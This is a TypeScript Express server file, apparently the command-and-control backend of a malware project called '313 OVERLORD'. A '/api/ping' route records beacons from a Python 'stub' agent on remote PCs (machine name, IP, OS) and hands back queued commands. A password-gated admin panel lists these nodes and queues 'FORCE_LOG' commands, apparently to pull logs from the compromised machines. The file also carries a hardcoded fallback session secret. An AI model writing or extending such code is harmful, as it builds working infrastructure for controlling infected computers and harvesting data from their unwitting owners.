import express, { Request, Response, NextFunction } from 'express';
import session from 'express-session';
import path from 'path';
import { fileURLToPath } from 'url';
import postgres from 'postgres';
import dotenv from 'dotenv';
import fs from 'fs-extra';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();

// --- DATABASE CONNECTION (NEON) ---
const sql = postgres(process.env.DATABASE_URL as string, { ssl: 'require' });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'dist'))); // Pasta do Vite Build

app.use(session({
    secret: process.env.SESSION_SECRET || 'overlord_313_secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Mude para true se usar HTTPS (VPS/Render)
}));

// --- MIDDLEWARE: SÓ VOCÊ ENTRA ---
const onlyBoss = (req: Request, res: Response, next: NextFunction) => {
    if (req.session && req.session.isAdmin) return next();
    res.status(401).send("UNAUTHORIZED_ACCESS");
};

// --- ROTAS DO AGENTE (STUB PYTHON) ---

app.post('/api/ping', async (req: Request, res: Response) => {
    const { pc_name, os_info } = req.body;
    const ip = String(req.headers['x-forwarded-for'] || req.socket.remoteAddress);

    try {
        // Atualiza o sinal de vida no banco
        const result = await sql`
            INSERT INTO nodes (pc_name, ip_address, os_info, last_ping)
            VALUES (${pc_name}, ${ip}, ${os_info}, NOW())
            ON CONFLICT (pc_name) 
            DO UPDATE SET last_ping = NOW(), ip_address = ${ip}, os_info = ${os_info}
            RETURNING pending_command
        `;
        
        const command = result[0]?.pending_command || 'IDLE';
        res.json({ command });

        // Se houver comando (ex: FORCE_LOG), limpa após enviar
        if (command !== 'IDLE') {
            await sql`UPDATE nodes SET pending_command = 'IDLE' WHERE pc_name = ${pc_name}`;
        }
    } catch (e) { res.status(500).json({ error: "Internal Error" }); }
});

// --- ROTAS DO PAINEL ADMIN ---

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    // Valida contra a senha definida no seu .env
    if (password === process.env.ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        return res.json({ success: true });
    }
    res.status(401).json({ success: false });
});

app.get('/api/nodes', onlyBoss, async (req, res) => {
    const nodes = await sql`SELECT * FROM nodes ORDER BY last_ping DESC`;
    res.json(nodes);
});

app.post('/api/command', onlyBoss, async (req, res) => {
    const { pc_name } = req.body;
    await sql`UPDATE nodes SET pending_command = 'FORCE_LOG' WHERE pc_name = ${pc_name}`;
    res.json({ success: true });
});

app.listen(process.env.PORT || 3000, () => console.log("--- 313 OVERLORD CORE ONLINE ---"));
